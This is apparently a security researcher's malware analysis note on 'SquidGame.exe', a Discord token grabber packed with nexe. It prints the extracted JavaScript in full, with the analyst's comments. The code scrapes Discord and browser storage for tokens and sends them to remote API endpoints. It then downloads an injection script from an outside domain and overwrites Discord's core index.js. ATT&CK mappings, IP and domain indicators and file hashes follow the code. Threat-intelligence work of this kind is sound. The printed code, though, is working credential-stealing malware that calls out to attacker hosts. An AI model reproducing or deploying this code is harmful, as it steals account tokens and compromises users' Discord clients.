---
attachments: [Clipboard_2022-01-28-10-49-33.png]
---

# "SquidGame.exe"
> Obvious way to identify:had a NodeJs Icon.

TL;DR:
Token grabber, packed nodejs.exe using "nexe"
Tries to get credentials from Browsers, and userToken from Discord(including Canary/Beta)

`Most AV's failed. Though I submitted this to some OpenSource IOC vendors so this might (hopefully) change in the future.` 
`edit: https://otx.alienvault.com/pulse/61f2066d7d39c8592ea6ae93/ : Someone added it to an existing collection under "Discord Malware", expected improved detection from AV's` 

Related communication graph (VirusTotal):
[Virustotal IP Map](https://www.virustotal.com/graph/gc091519e4d944294a819bb7843411e48340b8887bb1a44d28ac5e7c7b15cf6c2)
MD5:455b219da9629eeedeadbd9a275214ab1bb5dc73e00bb43efb5dd1db1f3e69a4

Extracted 'application' (Static Analysis):
(with my comments)
```js
//only the part which was the main "app", since this was packed with a node binary the "compiled" single file was huuuge
var authorization = "4680aad9db76c80a3ee73b85a611ad032e2f2e5b9e65c8e00062f069e3d363d6";
var status = "okbro";
fetch("https://3mn0za8lfg.execute-api.us-east-2.amazonaws.com/default/Status")
  .then((res) => res.text())
  .then(async (access) => {
    if (access === "ACTIVE") {
      function findToken(tokenPath) {
        tokenPath += "\\Local Storage\\leveldb";
        let tokens = [];
        try {
          fs.readdirSync(path.normalize(tokenPath)).map((file) => {
            if (file.endsWith(".log") || file.endsWith(".ldb")) {
              fs.readFileSync(`${tokenPath}\\${file}`, "utf8")
                .split(/\r?\n/)
                .forEach(async (line) => {
                  const regex = [
                    new RegExp(/mfa\.[\w-]{84}/g),
                    new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g),
                  ];
                  for (const _regex of regex) {
                    const token = line.match(_regex);
                    if (token) {
                      token.forEach((element) => {
                        tokens.push(element);
                      });
                    }
                  }
                });
            }
          });
        } catch {}
        return tokens;
      }
      function init() {
        let paths;
        const computerPlatform = process.platform;
        if (computerPlatform == "win32") {
          const local = process.env.LOCALAPPDATA;
          const roaming = process.env.APPDATA;
          paths = {
            Discord: path.join(roaming, "Discord"),
            "Discord Canary": path.join(roaming, "discordcanary"), //discord locs
            "Discord PTB": path.join(roaming, "discordptb"),
            "Google Chrome": path.join(
              local,
              "Google",
              "Chrome",
              "User Data",
              "Default"
            ),
            Opera: path.join(roaming, "Opera Software", "Opera Stable"),
            Brave: path.join(
              local,
              "BraveSoftware",
              "Brave-Browser",
              "User Data",
              "Default"
            ),
            Yandex: path.join(
              local,
              "Yandex",
              "YandexBrowser",
              "User Data",
              "Default"
            ),
          };
        }
        const tokens = {};
        for (let [platform, path] of Object.entries(paths)) {
          const tokenList = findToken(path);
          if (tokenList) {
            tokenList.forEach((token) => {
              if (tokens[platform] === undefined) tokens[platform] = [];
              tokens[platform].push(token);
            });
          }
        }
        console.log("Runtime Daemon Un-Responsive, Please Retry Later");
        async function fetchacc() {
          var tok = formatTokens(tokens);
          if (!tok) {
            fetch(
              "https://0t8q4rhz00.execute-api.us-east-2.amazonaws.com/default/Opened?token=fuckeduplol&auth=" + //fuckeduplol? lol.
                authorization,
              {
                method: "GET",
              }
            );
          }
          await tok.forEach(async (token) => {
            var ok;
            ok = token;
            token = token.split("okevmro|||---")[0];
            var platform = ok.split("okevmro|||---")[1];
            fetch(
              "https://0t8q4rhz00.execute-api.us-east-2.amazonaws.com/default/Opened?token=" +
                token +
                "&auth=" +
                authorization +
                "&lolbro=" +
                platform +
                "&elephantlol=" +
                status,
              {
                method: "GET",
              }
            );
          });
        }
        fetchacc();
        function formatTokens(obj) {
          var str = "";
          for (var p in obj) {
            if (obj.hasOwnProperty(p)) {
              var ee = obj[p];
              var arr = ee.toString().split(",");
              return (arr = arr.map((x) => x + "okevmro|||---" + p));
            }
          }
          return str + "okevmro|||---" + p;
        }
        async function GetIpAddress() {
          try {
            return `${await publicIp.v4()}`;
          } catch {
            return "No IP found :small_red_triangle_down:";  //this was fun to see in the sandbox (ip's are still up btw.)
          }
        }
      }
      /* 
        now here I tried to manually send a curl post req to the IP's with fake-ish tokens. 
        The result was an api which just returned a counter. (Repeated POST's and the count went up,so :shrug:)
      */
      init();
      const local = process.env.LOCALAPPDATA;
      const discords = [];
      async function start() {
        try {
          var inject;
          await fetch("http://primefa.xyz/injection")
            .then((code) => code.text())
            .then((res) => {
              res = res.replace("__AUTH__", authorization);
              inject = res;
            });
          await fs.readdir(local, async (err, files) => {
            await files.forEach(async (dirName) => {
              if (dirName.toString().includes("cord")) {
                await discords.push(dirName);
              }
            });
            discords.forEach(async (discordPath) => {
              await fs.readdir(local + "\\" + discordPath, (err, file) => {
                file.forEach(async (insideDiscordDir) => {
                  if (insideDiscordDir.includes("app-")) {
                    await fs.readdir(
                      local + "\\" + discordPath + "\\" + insideDiscordDir,
                      (err, file) => {
                        file.forEach(async (insideAppDir) => {
                          if (insideAppDir.includes("modules")) {
                            fs.readdir(
                              local +
                                "\\" +
                                discordPath +
                                "\\" +
                                insideDiscordDir +
                                "\\" +
                                insideAppDir,
                              (err, file) => {
                                file.forEach((insideModulesDir) => {
                                  if (
                                    insideModulesDir.includes(
                                      "discord_desktop_core"
                                    )
                                  ) {
                                    fs.readdir(
                                      local +
                                        "\\" +
                                        discordPath +
                                        "\\" +
                                        insideDiscordDir +
                                        "\\" +
                                        insideAppDir +
                                        "\\" +
                                        insideModulesDir,
                                      (err, file) => {
                                        file.forEach((insideCore) => {
                                          if (
                                            insideCore.includes(
                                              "discord_desktop_core"
                                            )
                                          ) {
                                            fs.readdir(
                                              local +
                                                "\\" +
                                                discordPath +
                                                "\\" +
                                                insideDiscordDir +
                                                "\\" +
                                                insideAppDir +
                                                "\\" +
                                                insideModulesDir +
                                                "\\" +
                                                insideCore,
                                              (err, file) => {
                                                file.forEach(
                                                  (insideCoreFinal) => {
                                                    if (
                                                      insideCoreFinal.includes(
                                                        "index.js"
                                                      )
                                                    ) {
                                                      status = "okbro"
                                                      fs.mkdir(
                                                        local +
                                                          "\\" +
                                                          discordPath +
                                                          "\\" +
                                                          insideDiscordDir +
                                                          "\\" +
                                                          insideAppDir +
                                                          "\\" +
                                                          insideModulesDir +
                                                          "\\" +
                                                          insideCore +
                                                          "\\SkullRules",
                                                        (err) => {}
                                                      );
                                                      fkill("discord");
                                                      fkill("discordPtb");
                                                      fs.writeFile(
                                                        local +
                                                          "\\" +
                                                          discordPath +
                                                          "\\" +
                                                          insideDiscordDir +
                                                          "\\" +
                                                          insideAppDir +
                                                          "\\" +
                                                          insideModulesDir +
                                                          "\\" +
                                                          insideCore +
                                                          "\\index.js",
                                                        inject,
                                                        (err) => {}
                                                      );
                                                    }
                                                  }
                                                );
                                              }
                                            );
                                          }
                                        });
                                      }
                                    );
                                  }
                                });
                              }
                            );
                          }
                        });
                      }
                    );
                  }
                });
              });
            });
          });
        } catch (err) {}
      }
      start()
    } else {
      return;
    }
  });
```
Screenshots (lol it takes like- 1 sec to do all this so sandboxing is...)
![Basically just a black console and boom.](@attachment/Clipboard_2022-01-28-10-49-33.png)
Behaviours observed (by ATT&CK Framework):
Defence Evasion:
T1112 - Modifying Registry
`"CREATE"; Path: "HKLM\SYSTEM\CONTROLSET001\SERVICES\TCPIP\PARAMETERS"`
Credential Access:
T1056.004 - Credential API Hooking (using Windows API)
Discovery:
T1012 - Registry Lookup (that's how T1112 was possible so-)
T1082 - Sysinfo discovery
`! It tried to open "\Device\KsecDD" (Kernel Security Device Driver) `
C&C - T1573 - "Encrypted Channel" (afforementioned HTTP requests)


IoC's by Domain/IP:
`	http://primefa.xyz/injection - HTTP GET req. sent`
`95.214.54.208 - this IP was contacted, and other 19 vulnerable EXE's were discovered tied to this IP`
-related MD5 hashes added in the end of file
```
3.18.71.91:443 (TCP)
95.214.54.208:80 (TCP)
```
JA3 SSL:
398430069e0a8ecfbc8db0778d658d77



Related MD5 to the mentioned IP:
[Virustotal Graph of the traced files {the Polish IP is highlighted}](https://www.virustotal.com/graph/embed/g0084e32dbbee44e7964615fbaec932877e8c2eae61a4447d8049d9643030876e)
095e93a25df029cc1fcfab1728561f7fba391d6f3f923d004b42e4641965843e,
09b6d0d6ac28b8ad31116110f5548238925e2fe31d12739248177ebfe249739c,
16c8c1e308a8645dc16e5264328fa91f1791f805bf2c007df0b4df1cf5b8045f,
2f5e8e01f7fa694f470d1e4023963f2a2945e304d06af1990845796b75bceb52,
327dafd21f62766286fb044450143e18c40b1ed3fdb6fe9c20550c5ee13584b6,
3a16e788c84c06ec770b9f6e6b4908b7d882dc69fba47776e03af5b30f254538,
455b219da9629eeedeadbd9a275214ab1bb5dc73e00bb43efb5dd1db1f3e69a4,(owo hi)
5e251414a3ddeb32d76d6d40053a7120094239b10407a07c4188eb0c8d1599af,
6fdfabc6ea97a8cbd7a959b4045e995a241d3342711791dd2aeda37e9ee58c86,
87e9b322f46832aef2290794e045345741d3d8c77e7ff9150fe0e6d9c3ee311d,
8d01566c3aa327d1944d56a8b9e76ad7c3dc2a713c75a511abcb7ac695cfc9ff,
8fddd5109c2990e18966afcf1c0f366c76ecaa2ea2bcbb22ef9e5f922aee4dbf,
9819202d3a2616b588e67df686384e4a3e18253c91a06b0108a3e992c42f1333,
a1aa7b7e4b63fae1cf183041cf4ece30bcdd8b00a4bc7800c17cb657ead488d1,
a33bc5ca32ded3eca4adea99ab69c579cb39b10afa2fe6f3c15711be6a4bbabb,
ba8bf819df7b95bb8e63fc2aa79384c40d909e67d5f6fcbf26e711e1a11c7853,
bb707787389327166a0fa0b31e80f8100e0c62a49bd34a0a199c535ffa4f65e1,
c3e7e78b931604b87690e8cb28e0cc0356130c745763b030a459d380aa07d68d,
d11223ee1183f5a4ca593f31842a440621fa8f8354b6ed65677164180879ade5,
db7196b3360ef26a7b02187d1df8b9afd5e1384812aa2e39ce22eae9ec996b86,
e133773df3ec10e27f1e1fe77903cf46e9ca0a510bacbb4c65d735801b8d0f15
